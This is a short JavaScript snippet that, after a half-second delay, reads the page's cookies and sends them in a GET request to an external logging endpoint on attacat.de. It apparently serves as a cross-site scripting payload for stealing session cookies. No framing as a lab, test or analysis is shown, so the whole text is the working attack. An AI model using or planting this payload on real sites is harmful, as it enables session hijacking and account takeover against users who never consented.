setTimeout(function () {
    var cookiecontent = document.cookie;
    var url = "https://attacat.de:8666/logger/log.jsp?cookie=" + cookiecontent;
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.open("GET", url);
    xmlhttp.send();
}, 500);